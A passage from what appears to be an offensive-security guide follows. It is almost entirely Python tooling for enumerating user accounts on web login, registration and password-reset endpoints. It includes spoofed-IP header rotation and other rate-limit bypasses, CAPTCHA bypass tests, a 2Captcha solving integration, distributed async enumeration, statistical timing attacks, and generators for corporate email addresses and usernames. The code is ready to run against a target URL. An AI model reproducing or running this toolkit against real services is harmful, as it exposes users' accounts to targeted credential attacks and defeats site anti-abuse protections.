                "password": password
            }

            try:
                resp = self.session.post(
                    self.target_url,
                    json=payload,
                    headers={"Content-Type": "application/json"}
                )

                results.append({
                    "username": username,
                    "status_code": resp.status_code,
                    "content_length": len(resp.content),
                    "header_length": sum(len(k) + len(v) for k, v in resp.headers.items()),
                    "total_size": len(resp.content) + sum(len(k) + len(v) for k, v in resp.headers.items())
                })
            except Exception as e:
                results.append({"username": username, "error": str(e)})

        return self._analyze_results(results)

    def _analyze_results(self, results: List[Dict]) -> Dict:
        """Analyze collected results for enumeration indicators"""
        valid_results = [r for r in results if "content_length" in r]

        if len(valid_results) < 2:
            return {"error": "Not enough valid results"}

        # Group by content length
        size_groups = Counter(r["content_length"] for r in valid_results)

        # Find outliers
        sizes = [r["content_length"] for r in valid_results]
        mean_size = statistics.mean(sizes)
        stdev_size = statistics.stdev(sizes) if len(sizes) > 1 else 0

        outliers = []
        for result in valid_results:
            if stdev_size > 0:
                z_score = abs(result["content_length"] - mean_size) / stdev_size
                if z_score > 2:
                    outliers.append({
                        **result,
                        "z_score": z_score
                    })

        return {
            "total_tested": len(valid_results),
            "size_distribution": dict(size_groups),
            "mean_size": mean_size,
            "stdev_size": stdev_size,
            "outliers": outliers,
            "potential_valid_users": [o["username"] for o in outliers],
            "enumerable": len(size_groups) > 1  # Different response sizes detected
        }

    def compare_specific_users(self, user1: str, user2: str, iterations: int = 5) -> Dict:
        """Compare response sizes between two specific users"""
        user1_sizes = []
        user2_sizes = []

        for _ in range(iterations):
            # User 1
            try:
                resp = self.session.post(
                    self.target_url,
                    json={"email": user1, "password": "test"}
                )
                user1_sizes.append(len(resp.content))
            except:
                pass

            # User 2
            try:
                resp = self.session.post(
                    self.target_url,
                    json={"email": user2, "password": "test"}
                )
                user2_sizes.append(len(resp.content))
            except:
                pass

        return {
            "user1": {
                "username": user1,
                "sizes": user1_sizes,
                "mean": statistics.mean(user1_sizes) if user1_sizes else None
            },
            "user2": {
                "username": user2,
                "sizes": user2_sizes,
                "mean": statistics.mean(user2_sizes) if user2_sizes else None
            },
            "different": (
                statistics.mean(user1_sizes) != statistics.mean(user2_sizes)
                if user1_sizes and user2_sizes else None
            )
        }


# Response characteristics to analyze
RESPONSE_CHARACTERISTICS = {
    "content_indicators": [
        "response body length",
        "JSON field count",
        "error message length",
        "HTML element count",
        "script/style inclusion",
    ],

    "header_indicators": [
        "Set-Cookie header presence",
        "X-RateLimit headers",
        "Custom headers",
        "Cache-Control differences",
        "Content-Type variations",
    ],

    "timing_indicators": [
        "Total response time",
        "Time to first byte",
        "Connection reuse patterns",
    ]
}
```

---

## 2. Prevention Bypass Techniques

### 2.1 Rate Limit Bypass for Enumeration

```python
#!/usr/bin/env python3
"""
Rate Limit Bypass Techniques for Enumeration
Comprehensive bypass methods for rate-limited endpoints
"""

import requests
import time
import random
import string
import asyncio
import aiohttp
from typing import Dict, List, Generator
from concurrent.futures import ThreadPoolExecutor

class RateLimitBypass:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()

    def ip_rotation_headers(self) -> Generator[Dict, None, None]:
        """Generate rotating IP headers"""
        while True:
            ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            yield {
                "X-Forwarded-For": ip,
                "X-Real-IP": ip,
                "X-Client-IP": ip,
                "X-Originating-IP": ip,
                "CF-Connecting-IP": ip,
                "True-Client-IP": ip,
                "X-Remote-IP": ip,
                "X-Remote-Addr": ip,
                "Forwarded": f"for={ip}",
                "X-Forwarded-Host": f"client-{random.randint(1,99999)}.example.com",
            }

    def enumerate_with_header_rotation(self, usernames: List[str]) -> List[Dict]:
        """Enumerate users with IP header rotation"""
        results = []
        ip_gen = self.ip_rotation_headers()

        for username in usernames:
            headers = next(ip_gen)
            headers["Content-Type"] = "application/json"

            try:
                resp = self.session.post(
                    self.target_url,
                    json={"email": username, "password": "test"},
                    headers=headers
                )

                results.append({
                    "username": username,
                    "status": resp.status_code,
                    "rate_limited": resp.status_code == 429,
                    "response": resp.text[:200]
                })

            except Exception as e:
                results.append({"username": username, "error": str(e)})

            time.sleep(0.1)

        return results

    def endpoint_variation_bypass(self, usernames: List[str]) -> List[Dict]:
        """Bypass rate limits using endpoint URL variations"""
        from urllib.parse import urlparse, urlunparse

        parsed = urlparse(self.target_url)
        path = parsed.path

        # Generate path variations
        variations = [
            path,
            path.upper(),
            path + "/",
            path + "//",
            path + "/.",
            path + "?",
            path + "#",
            path + ";",
            "/" + path.lstrip("/"),
            path.replace("/", "//"),
            path + "%20",
            path + "%00",
        ]

        results = []

        for username in usernames:
            for var_path in variations:
                var_url = urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    var_path,
                    parsed.params,
                    parsed.query,
                    parsed.fragment
                ))

                try:
                    resp = self.session.post(
                        var_url,
                        json={"email": username, "password": "test"},
                        headers={"Content-Type": "application/json"}
                    )

                    if resp.status_code != 429:
                        results.append({
                            "username": username,
                            "working_variation": var_path,
                            "status": resp.status_code
                        })
                        break  # Found working variation

                except Exception:
                    continue

            time.sleep(0.05)

        return results

    def parameter_pollution_bypass(self, usernames: List[str]) -> List[Dict]:
        """Bypass using parameter pollution/padding"""
        results = []

        for username in usernames:
            # Add random parameters to make each request unique
            random_params = {
                ''.join(random.choices(string.ascii_lowercase, k=8)): str(random.randint(1, 99999))
                for _ in range(3)
            }

            payload = {
                "email": username,
                "password": "test",
                **random_params
            }

            # Also add URL parameters
            url_params = '&'.join(f"{k}={v}" for k, v in random_params.items())
            full_url = f"{self.target_url}?{url_params}"

            try:
                resp = self.session.post(
                    full_url,
                    json=payload,
                    headers={"Content-Type": "application/json"}
                )

                results.append({
                    "username": username,
                    "status": resp.status_code,
                    "bypassed": resp.status_code != 429
                })

            except Exception as e:
                results.append({"username": username, "error": str(e)})

            time.sleep(0.05)

        return results

    def session_rotation_bypass(self, usernames: List[str]) -> List[Dict]:
        """Bypass by rotating session/cookies"""
        results = []

        for username in usernames:
            # Create new session for each request
            fresh_session = requests.Session()

            try:
                resp = fresh_session.post(
                    self.target_url,
                    json={"email": username, "password": "test"},
                    headers={
                        "Content-Type": "application/json",
                        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(500,600)}.{random.randint(1,99)}"
                    }
                )

                results.append({
                    "username": username,
                    "status": resp.status_code,
                    "bypassed": resp.status_code != 429
                })

            except Exception as e:
                results.append({"username": username, "error": str(e)})

            fresh_session.close()
            time.sleep(0.05)

        return results

    async def distributed_enumeration(self, usernames: List[str], concurrent: int = 10) -> List[Dict]:
        """Distributed enumeration using async requests with rotation"""
        results = []
        ip_gen = self.ip_rotation_headers()

        async with aiohttp.ClientSession() as session:
            semaphore = asyncio.Semaphore(concurrent)

            async def check_user(username: str) -> Dict:
                async with semaphore:
                    headers = next(ip_gen)
                    headers["Content-Type"] = "application/json"

                    try:
                        async with session.post(
                            self.target_url,
                            json={"email": username, "password": "test"},
                            headers=headers,
                            timeout=aiohttp.ClientTimeout(total=10)
                        ) as resp:
                            return {
                                "username": username,
                                "status": resp.status,
                                "bypassed": resp.status != 429
                            }
                    except Exception as e:
                        return {"username": username, "error": str(e)}

            tasks = [check_user(username) for username in usernames]
            results = await asyncio.gather(*tasks)

        return list(results)


# Rate limit detection patterns
RATE_LIMIT_INDICATORS = {
    "status_codes": [429, 503],
    "headers": [
        "X-RateLimit-Limit",
        "X-RateLimit-Remaining",
        "X-RateLimit-Reset",
        "Retry-After",
        "X-Rate-Limit-Limit",
        "RateLimit-Limit",
        "RateLimit-Remaining",
        "RateLimit-Reset",
    ],
    "response_patterns": [
        "rate limit",
        "too many requests",
        "slow down",
        "try again later",
        "request limit exceeded",
        "throttled",
    ]
}
```

---

### 2.2 CAPTCHA Bypass for Enumeration

```python
#!/usr/bin/env python3
"""
CAPTCHA Bypass Techniques for Enumeration
Methods to bypass CAPTCHA during user enumeration
"""

import requests
import time
import base64
from typing import Dict, List, Optional

class CaptchaBypassEnumeration:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()

    def test_captcha_enforcement(self, username: str) -> Dict:
        """Test if CAPTCHA is actually enforced"""
        tests = []

        # Test 1: No CAPTCHA parameter
        try:
            resp = self.session.post(
                self.target_url,
                json={"email": username, "password": "test"}
            )
            tests.append({
                "test": "No CAPTCHA parameter",
                "status": resp.status_code,
                "bypassed": resp.status_code not in [400, 422]
            })
        except:
            pass

        # Test 2: Empty CAPTCHA
        captcha_fields = ["captcha", "g-recaptcha-response", "h-captcha-response", "turnstile"]
        for field in captcha_fields:
            try:
                resp = self.session.post(
                    self.target_url,
                    json={"email": username, "password": "test", field: ""}
                )
                tests.append({
                    "test": f"Empty {field}",
                    "status": resp.status_code,
                    "bypassed": resp.status_code not in [400, 422]
                })
            except:
                pass

        # Test 3: Null CAPTCHA
        for field in captcha_fields:
            try:
                resp = self.session.post(
                    self.target_url,
                    json={"email": username, "password": "test", field: None}
                )
                tests.append({
                    "test": f"Null {field}",
                    "status": resp.status_code,
                    "bypassed": resp.status_code not in [400, 422]
                })
            except:
                pass

        return {"username": username, "tests": tests}

    def test_captcha_caching(self, valid_captcha: str, usernames: List[str]) -> List[Dict]:
        """Test if CAPTCHA tokens can be reused for enumeration"""
        results = []

        for username in usernames:
            try:
                resp = self.session.post(
                    self.target_url,
                    json={
                        "email": username,
                        "password": "test",
                        "g-recaptcha-response": valid_captcha
                    }
                )

                results.append({
                    "username": username,
                    "status": resp.status_code,
                    "token_accepted": resp.status_code not in [400, 422],
                    "response": resp.text[:200]
                })

            except Exception as e:
                results.append({"username": username, "error": str(e)})

            time.sleep(0.5)

        return results

    def mobile_api_bypass(self, usernames: List[str]) -> List[Dict]:
        """Test mobile API endpoints which may not have CAPTCHA"""
        mobile_endpoints = [
            "/api/mobile/login",
            "/api/v1/mobile/auth",
            "/mobile/api/login",
            "/app/api/login",
            "/api/app/auth",
        ]

        results = []
        base_url = self.target_url.rsplit('/', 1)[0]  # Remove path to get base

        for endpoint in mobile_endpoints:
            for username in usernames[:5]:  # Test first 5 users
                try:
                    resp = self.session.post(
                        f"{base_url}{endpoint}",
                        json={"email": username, "password": "test"},
                        headers={
                            "Content-Type": "application/json",
                            "X-Requested-With": "com.example.app",
                            "User-Agent": "ExampleApp/1.0 (Android 11)"
                        }
                    )

                    if resp.status_code != 404:
                        results.append({
                            "endpoint": endpoint,
                            "username": username,
                            "status": resp.status_code,
                            "no_captcha_required": "captcha" not in resp.text.lower()
                        })

                except Exception:
                    continue

        return results

    def header_bypass_test(self, usernames: List[str]) -> List[Dict]:
        """Test if certain headers bypass CAPTCHA"""
        bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Internal-Request": "true"},
            {"X-Admin-Request": "true"},
            {"Origin": "http://localhost"},
            {"X-Requested-With": "XMLHttpRequest"},
            {"X-CAPTCHA-Bypass": "true"},
            {"X-Testing": "true"},
        ]

        results = []

        for username in usernames[:3]:
            for headers in bypass_headers:
                try:
                    all_headers = {"Content-Type": "application/json", **headers}
                    resp = self.session.post(
                        self.target_url,
                        json={"email": username, "password": "test"},
                        headers=all_headers
                    )

                    if resp.status_code not in [400, 422] and "captcha" not in resp.text.lower():
                        results.append({
                            "username": username,
                            "bypass_header": headers,
                            "status": resp.status_code,
                            "success": True
                        })

                except Exception:
                    continue

        return results

    def get_solving_service_integration(self) -> Dict:
        """Get information about CAPTCHA solving service integration"""
        return {
            "services": [
                {
                    "name": "2Captcha",
                    "integration": """
import requests
import time

CAPTCHA_API_KEY = "your_api_key"

def solve_recaptcha(site_key, page_url):
    # Submit CAPTCHA
    submit_url = "http://2captcha.com/in.php"
    resp = requests.post(submit_url, data={
        "key": CAPTCHA_API_KEY,
        "method": "userrecaptcha",
        "googlekey": site_key,
        "pageurl": page_url,
        "json": 1
    })

    if resp.json()["status"] != 1:
        return None

    captcha_id = resp.json()["request"]

    # Wait and retrieve
    result_url = f"http://2captcha.com/res.php?key={CAPTCHA_API_KEY}&action=get&id={captcha_id}&json=1"

    for _ in range(30):  # Max 30 attempts
        time.sleep(5)
        resp = requests.get(result_url)
        data = resp.json()

        if data["status"] == 1:
            return data["request"]

    return None

# Use in enumeration
def enumerate_with_captcha_solving(usernames, login_url, site_key):
    for username in usernames:
        token = solve_recaptcha(site_key, login_url)
        if token:
            resp = requests.post(login_url, json={
                "email": username,
                "password": "test",
                "g-recaptcha-response": token
            })
            # Analyze response for enumeration
"""
                },
                {
                    "name": "Anti-Captcha",
                    "note": "Similar API structure to 2Captcha"
                },
                {
                    "name": "CapMonster",
                    "note": "Local solving software - no API calls needed"
                }
            ],
            "cost_consideration": "Solving services cost ~$2-3 per 1000 CAPTCHAs"
        }
```

---

### 2.3 Distributed Enumeration

```python
#!/usr/bin/env python3
"""
Distributed User Enumeration Framework
Coordinate enumeration across multiple sources
"""

import asyncio
import aiohttp
import random
import time
from typing import Dict, List, Callable
from dataclasses import dataclass
from abc import ABC, abstractmethod

@dataclass
class EnumerationResult:
    username: str
    exists: bool
    source: str
    confidence: float
    raw_response: str

class EnumerationSource(ABC):
    """Abstract base class for enumeration sources"""

    @abstractmethod
    async def check_user(self, session: aiohttp.ClientSession, username: str) -> EnumerationResult:
        pass

class LoginEndpointSource(EnumerationSource):
    def __init__(self, url: str, user_field: str = "email", pass_field: str = "password"):
        self.url = url
        self.user_field = user_field
        self.pass_field = pass_field

    async def check_user(self, session: aiohttp.ClientSession, username: str) -> EnumerationResult:
        try:
            async with session.post(
                self.url,
                json={self.user_field: username, self.pass_field: "test"},
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                text = await resp.text()
                # Analyze response for enumeration indicators
                exists = "incorrect password" in text.lower() or "account locked" in text.lower()

                return EnumerationResult(
                    username=username,
                    exists=exists,
                    source="login",
                    confidence=0.8 if exists else 0.2,
                    raw_response=text[:200]
                )
        except Exception as e:
            return EnumerationResult(username=username, exists=False, source="login", confidence=0, raw_response=str(e))

class RegistrationSource(EnumerationSource):
    def __init__(self, url: str, email_field: str = "email"):
        self.url = url
        self.email_field = email_field

    async def check_user(self, session: aiohttp.ClientSession, username: str) -> EnumerationResult:
        try:
            async with session.post(
                self.url,
                json={self.email_field: username, "password": "TestPass123!"},
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                text = await resp.text()
                exists = any(x in text.lower() for x in ["already", "exists", "taken", "registered"])

                return EnumerationResult(
                    username=username,
                    exists=exists,
                    source="registration",
                    confidence=0.9 if exists else 0.1,
                    raw_response=text[:200]
                )
        except Exception as e:
            return EnumerationResult(username=username, exists=False, source="registration", confidence=0, raw_response=str(e))

class PasswordResetSource(EnumerationSource):
    def __init__(self, url: str, email_field: str = "email"):
        self.url = url
        self.email_field = email_field

    async def check_user(self, session: aiohttp.ClientSession, username: str) -> EnumerationResult:
        try:
            start = time.time()
            async with session.post(
                self.url,
                json={self.email_field: username},
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                elapsed = time.time() - start
                text = await resp.text()

                # Longer response time might indicate email being sent
                exists = elapsed > 1.0 or "sent" in text.lower() or "check your email" in text.lower()

                return EnumerationResult(
                    username=username,
                    exists=exists,
                    source="password_reset",
                    confidence=0.7 if exists else 0.3,
                    raw_response=text[:200]
                )
        except Exception as e:
            return EnumerationResult(username=username, exists=False, source="password_reset", confidence=0, raw_response=str(e))

class DistributedEnumerator:
    """Coordinate enumeration across multiple sources and IPs"""

    def __init__(self, sources: List[EnumerationSource]):
        self.sources = sources
        self.results: Dict[str, List[EnumerationResult]] = {}

    def _generate_headers(self) -> Dict:
        """Generate randomized headers"""
        ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        return {
            "Content-Type": "application/json",
            "X-Forwarded-For": ip,
            "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(500,600)}.{random.randint(1,99)}"
        }

    async def enumerate(self, usernames: List[str], concurrency: int = 5) -> Dict[str, Dict]:
        """Enumerate users across all sources"""
        semaphore = asyncio.Semaphore(concurrency)

        async def check_with_source(source: EnumerationSource, username: str):
            async with semaphore:
                connector = aiohttp.TCPConnector(ssl=False)
                async with aiohttp.ClientSession(connector=connector, headers=self._generate_headers()) as session:
                    result = await source.check_user(session, username)
                    return result

        # Create tasks for all combinations
        tasks = []
        for username in usernames:
            for source in self.sources:
                tasks.append(check_with_source(source, username))

        # Execute all tasks
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Organize results by username
        organized = {}
        for result in results:
            if isinstance(result, EnumerationResult):
                if result.username not in organized:
                    organized[result.username] = []
                organized[result.username].append(result)

        return self._analyze_combined_results(organized)

    def _analyze_combined_results(self, results: Dict[str, List[EnumerationResult]]) -> Dict[str, Dict]:
        """Combine results from multiple sources for final verdict"""
        final_results = {}

        for username, source_results in results.items():
            # Calculate weighted confidence
            total_weight = sum(r.confidence for r in source_results)
            positive_weight = sum(r.confidence for r in source_results if r.exists)

            combined_confidence = positive_weight / total_weight if total_weight > 0 else 0

            final_results[username] = {
                "exists": combined_confidence > 0.5,
                "confidence": combined_confidence,
                "sources_checked": len(source_results),
                "positive_sources": sum(1 for r in source_results if r.exists),
                "details": [
                    {
                        "source": r.source,
                        "exists": r.exists,
                        "confidence": r.confidence
                    }
                    for r in source_results
                ]
            }

        return final_results

# Usage example
async def main():
    sources = [
        LoginEndpointSource("https://target.com/api/login"),
        RegistrationSource("https://target.com/api/register"),
        PasswordResetSource("https://target.com/api/forgot-password"),
    ]

    enumerator = DistributedEnumerator(sources)

    usernames = [
        "admin@target.com",
        "user@target.com",
        "test@target.com",
    ]

    results = await enumerator.enumerate(usernames)

    for username, result in results.items():
        if result["exists"]:
            print(f"[+] FOUND: {username} (confidence: {result['confidence']:.2f})")

if __name__ == "__main__":
    asyncio.run(main())
```

---

### 2.4 Timing Attack Refinement

```python
#!/usr/bin/env python3
"""
Advanced Timing Attack Techniques
Refined methods for timing-based enumeration
"""

import requests
import time
import statistics
import numpy as np
from typing import Dict, List, Tuple
from scipy import stats
from concurrent.futures import ThreadPoolExecutor

class RefinedTimingAttack:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()

    def high_precision_timing(self, username: str, iterations: int = 50) -> Dict:
        """High-precision timing measurement with statistical analysis"""
        times = []

        for _ in range(iterations):
            # Use multiple timing methods
            wall_start = time.time()
            perf_start = time.perf_counter()
            mono_start = time.monotonic()

            try:
                resp = self.session.post(
                    self.target_url,
                    json={"email": username, "password": "test"},
                    headers={"Content-Type": "application/json"}
                )

                wall_end = time.time()
                perf_end = time.perf_counter()
                mono_end = time.monotonic()

                times.append({
                    "wall": wall_end - wall_start,
                    "perf": perf_end - perf_start,
                    "mono": mono_end - mono_start,
                    "server_time": float(resp.headers.get("X-Response-Time", 0)) / 1000 if "X-Response-Time" in resp.headers else None
                })

            except Exception:
                continue

            time.sleep(0.05)  # Small delay to avoid overwhelming

        if not times:
            return {"username": username, "error": "All requests failed"}

        # Statistical analysis
        perf_times = [t["perf"] for t in times]

        return {
            "username": username,
            "iterations": len(times),
            "mean": statistics.mean(perf_times),
            "median": statistics.median(perf_times),
            "stdev": statistics.stdev(perf_times) if len(perf_times) > 1 else 0,
            "min": min(perf_times),
            "max": max(perf_times),
            "iqr": np.percentile(perf_times, 75) - np.percentile(perf_times, 25),
            "percentile_95": np.percentile(perf_times, 95),
            "raw_times": perf_times
        }

    def comparative_timing_analysis(self, known_valid: str, known_invalid: str, test_users: List[str]) -> Dict:
        """Compare timing against known valid and invalid users"""
        # Measure baselines
        print("[*] Measuring valid user baseline...")
        valid_baseline = self.high_precision_timing(known_valid)

        print("[*] Measuring invalid user baseline...")
        invalid_baseline = self.high_precision_timing(known_invalid)

        # Calculate discrimination threshold
        valid_mean = valid_baseline["mean"]
        invalid_mean = invalid_baseline["mean"]
        threshold = (valid_mean + invalid_mean) / 2

        print(f"[*] Valid mean: {valid_mean:.4f}s")
        print(f"[*] Invalid mean: {invalid_mean:.4f}s")
        print(f"[*] Threshold: {threshold:.4f}s")

        # Test unknown users
        results = []
        for username in test_users:
            timing = self.high_precision_timing(username, iterations=20)

            if "mean" in timing:
                # Determine likely status based on timing
                user_mean = timing["mean"]

                # Use statistical test
                t_stat_valid, p_valid = stats.ttest_ind(
                    timing["raw_times"],
                    valid_baseline["raw_times"]
                )
                t_stat_invalid, p_invalid = stats.ttest_ind(
                    timing["raw_times"],
                    invalid_baseline["raw_times"]
                )

                # Closer to which baseline?
                diff_from_valid = abs(user_mean - valid_mean)
                diff_from_invalid = abs(user_mean - invalid_mean)

                likely_valid = diff_from_valid < diff_from_invalid

                results.append({
                    "username": username,
                    "mean_time": user_mean,
                    "likely_valid": likely_valid,
                    "confidence": 1 - min(p_valid, p_invalid),
                    "diff_from_valid": diff_from_valid,
                    "diff_from_invalid": diff_from_invalid
                })

                if likely_valid:
                    print(f"[+] LIKELY VALID: {username} (mean: {user_mean:.4f}s)")

        return {
            "valid_baseline": valid_baseline,
            "invalid_baseline": invalid_baseline,
            "threshold": threshold,
            "results": results
        }

    def network_noise_filtering(self, username: str, iterations: int = 100) -> Dict:
        """Filter network noise for more accurate timing"""
        times = []

        for _ in range(iterations):
            start = time.perf_counter()
            try:
                resp = self.session.post(
                    self.target_url,
                    json={"email": username, "password": "test"}
                )
                end = time.perf_counter()
                times.append(end - start)
            except:
                continue
            time.sleep(0.02)

        if len(times) < 10:
            return {"username": username, "error": "Not enough samples"}

        # Remove outliers using IQR method
        q1 = np.percentile(times, 25)
        q3 = np.percentile(times, 75)
        iqr = q3 - q1

        lower_bound = q1 - 1.5 * iqr
        upper_bound = q3 + 1.5 * iqr

        filtered_times = [t for t in times if lower_bound <= t <= upper_bound]

        return {
            "username": username,
            "raw_count": len(times),
            "filtered_count": len(filtered_times),
            "outliers_removed": len(times) - len(filtered_times),
            "raw_mean": statistics.mean(times),
            "filtered_mean": statistics.mean(filtered_times) if filtered_times else None,
            "raw_stdev": statistics.stdev(times) if len(times) > 1 else 0,
            "filtered_stdev": statistics.stdev(filtered_times) if len(filtered_times) > 1 else 0
        }

    def password_complexity_timing(self, username: str) -> Dict:
        """
        Test timing based on password complexity
        Valid users may show timing differences based on password processing
        """
        passwords = [
            "a",  # Very short
            "a" * 10,  # Short
            "a" * 50,  # Medium
            "a" * 100,  # Long
            "a" * 500,  # Very long
        ]

        results = []

        for password in passwords:
            times = []
            for _ in range(10):
                start = time.perf_counter()
                try:
                    self.session.post(
                        self.target_url,
                        json={"email": username, "password": password}
                    )
                    times.append(time.perf_counter() - start)
                except:
                    continue
                time.sleep(0.05)

            if times:
                results.append({
                    "password_length": len(password),
                    "mean_time": statistics.mean(times),
                    "stdev": statistics.stdev(times) if len(times) > 1 else 0
                })

        # Check for correlation between password length and time
        if len(results) >= 3:
            lengths = [r["password_length"] for r in results]
            times = [r["mean_time"] for r in results]
            correlation, p_value = stats.pearsonr(lengths, times)

            return {
                "username": username,
                "timing_by_length": results,
                "correlation": correlation,
                "p_value": p_value,
                "timing_varies_with_length": abs(correlation) > 0.5 and p_value < 0.05
            }

        return {"username": username, "timing_by_length": results}
```

---

## 3. Wordlists for Enumeration

### 3.1 Email Generation

```python
#!/usr/bin/env python3
"""
Email Address Generation for Enumeration
Generate targeted email lists for enumeration attacks
"""

from typing import List, Generator
import itertools

class EmailGenerator:
    COMMON_DOMAINS = [
        "gmail.com", "yahoo.com", "hotmail.com", "outlook.com",
        "aol.com", "icloud.com", "mail.com", "protonmail.com",
        "live.com", "msn.com", "ymail.com", "me.com"
    ]

    COMMON_FIRST_NAMES = [
        "john", "jane", "michael", "sarah", "david", "emily",
        "robert", "jennifer", "william", "elizabeth", "james", "mary",
        "richard", "patricia", "joseph", "linda", "thomas", "barbara"
    ]

    COMMON_LAST_NAMES = [
        "smith", "johnson", "williams", "brown", "jones", "garcia",
        "miller", "davis", "rodriguez", "martinez", "hernandez", "lopez",
        "gonzalez", "wilson", "anderson", "thomas", "taylor", "moore"
    ]

    @classmethod
    def generate_corporate_emails(cls, domain: str, count: int = 1000) -> Generator[str, None, None]:
        """Generate corporate email patterns"""
        patterns = [
            "{first}@{domain}",
            "{last}@{domain}",
            "{first}.{last}@{domain}",
            "{first}{last}@{domain}",
            "{f}{last}@{domain}",
            "{first}.{l}@{domain}",
            "{first}_{last}@{domain}",
            "{f}.{last}@{domain}",
            "{first}{l}@{domain}",
            "{l}{first}@{domain}",
        ]

        generated = 0
        for first, last in itertools.product(cls.COMMON_FIRST_NAMES, cls.COMMON_LAST_NAMES):
            if generated >= count:
                break

            for pattern in patterns:
                if generated >= count:
                    break

                email = pattern.format(
                    first=first,
                    last=last,
                    f=first[0],
                    l=last[0],
                    domain=domain
                )
                yield email
                generated += 1

    @classmethod
    def generate_common_usernames(cls, domain: str = None) -> Generator[str, None, None]:
        """Generate common username-based emails"""
        common_usernames = [
            "admin", "administrator", "webmaster", "info", "contact",
            "support", "help", "sales", "marketing", "hr", "careers",
            "billing", "accounting", "security", "tech", "it",
            "dev", "development", "engineering", "ops", "devops",
            "ceo", "cto", "cfo", "coo", "vp", "director",
            "manager", "team", "staff", "office", "main",
            "general", "public", "press", "media", "news",
            "test", "demo", "sample", "example", "user",
        ]

        for username in common_usernames:
            if domain:
                yield f"{username}@{domain}"
            else:
                for d in cls.COMMON_DOMAINS:
                    yield f"{username}@{d}"

    @classmethod
    def generate_variations(cls, base_email: str) -> List[str]:
        """Generate variations of a known email"""
        local, domain = base_email.split('@')

        variations = [base_email]

        # Numeric suffixes
        for i in range(1, 100):
            variations.append(f"{local}{i}@{domain}")
            variations.append(f"{local}_{i}@{domain}")
            variations.append(f"{local}.{i}@{domain}")

        # Common suffixes
        suffixes = ["test", "dev", "old", "new", "backup", "temp", "admin", "main"]
        for suffix in suffixes:
            variations.append(f"{local}.{suffix}@{domain}")
            variations.append(f"{local}_{suffix}@{domain}")
            variations.append(f"{local}{suffix}@{domain}")

        # Year suffixes
        for year in range(2015, 2026):
            variations.append(f"{local}{year}@{domain}")
            variations.append(f"{local}_{year}@{domain}")

        return variations

    @classmethod
    def generate_from_linkedin(cls, company_domain: str, employee_names: List[str]) -> Generator[str, None, None]:
        """Generate emails from LinkedIn-style names"""
        for name in employee_names:
            parts = name.lower().split()
            if len(parts) >= 2:
                first = parts[0]
                last = parts[-1]
                f = first[0]
                l = last[0]

                patterns = [
                    f"{first}@{company_domain}",
                    f"{last}@{company_domain}",
                    f"{first}.{last}@{company_domain}",
                    f"{first}{last}@{company_domain}",
                    f"{f}{last}@{company_domain}",
                    f"{first}.{l}@{company_domain}",
                    f"{first}_{last}@{company_domain}",
                    f"{f}.{last}@{company_domain}",
                ]

                for email in patterns:
                    yield email


# Common email prefixes for enumeration
EMAIL_PREFIXES = """
admin
administrator
info
contact
support
help
sales
marketing
hr
careers
jobs
recruiting
billing
finance
accounting
security
it
tech
helpdesk
webmaster
postmaster
hostmaster
abuse
noc
operations
ops
devops
engineering
dev
development
qa
testing
communications
pr
press
media
legal
compliance
privacy
investor
partners
business
enterprise
team
staff
office
general
main
reception
hello
hi
inquiries
questions
feedback
suggestions
newsletter
subscribe
unsubscribe
notifications
alerts
updates
news
blog
social
community
events
training
education
research
product
service
customer
client
vendor
supplier
procurement
purchasing
orders
shipping
logistics
returns
refunds
warranty
""".strip().split('\n')

# Username wordlist for enumeration
USERNAMES_WORDLIST = """
admin
root
user
test
guest
demo
administrator
manager
superuser
operator
support
helpdesk
service
system
backup
webmaster
ftpuser
www
web
mail
email
smtp
imap
pop
api
app
mobile
dev
developer
development
staging
production
qa
testing
security
audit
monitor
logging
backup
restore
deploy
release
build
ci
cd
jenkins
git
svn
""".strip().split('\n')
```

---

## 4. Complete Enumeration Framework

```python
#!/usr/bin/env python3
"""
Complete User Enumeration Framework
Comprehensive tool combining all enumeration techniques
"""

import asyncio
import aiohttp
import argparse
import json
import time
from typing import Dict, List, Optional
from dataclasses import dataclass, asdict
from enum import Enum

class EnumerationMethod(Enum):
    LOGIN = "login"
    REGISTRATION = "registration"
    PASSWORD_RESET = "password_reset"
    API = "api"
    TIMING = "timing"
    RESPONSE_SIZE = "response_size"

@dataclass
class EnumerationConfig:
    target_base_url: str
    login_endpoint: str = "/api/login"
    register_endpoint: str = "/api/register"
    reset_endpoint: str = "/api/forgot-password"
    username_field: str = "email"
    password_field: str = "password"
    threads: int = 5
    delay: float = 0.5
    timeout: int = 10
    methods: List[EnumerationMethod] = None

    def __post_init__(self):
        if self.methods is None:
            self.methods = list(EnumerationMethod)

@dataclass
class EnumerationFinding:
    username: str
    exists: bool
    confidence: float
    method: str
    indicators: List[str]
    timing: Optional[float] = None
    response_size: Optional[int] = None

class EnumerationFramework:
    def __init__(self, config: EnumerationConfig):
        self.config = config
        self.findings: List[EnumerationFinding] = []
        self.baseline = {}

    async def run_enumeration(self, usernames: List[str]) -> List[EnumerationFinding]:
        """Run full enumeration against username list"""
        print(f"[*] Starting enumeration of {len(usernames)} usernames")
        print(f"[*] Methods: {[m.value for m in self.config.methods]}")

        # Establish baselines
        await self._establish_baselines()

        # Run enumeration
        connector = aiohttp.TCPConnector(limit=self.config.threads)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for username in usernames:
                task = self._check_username(session, username)
                tasks.append(task)

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for result in results:
                if isinstance(result, EnumerationFinding):
                    self.findings.append(result)
                    if result.exists:
                        print(f"[+] FOUND: {result.username} (confidence: {result.confidence:.2f}, method: {result.method})")

        return self.findings

    async def _establish_baselines(self):
        """Establish baselines for comparison"""
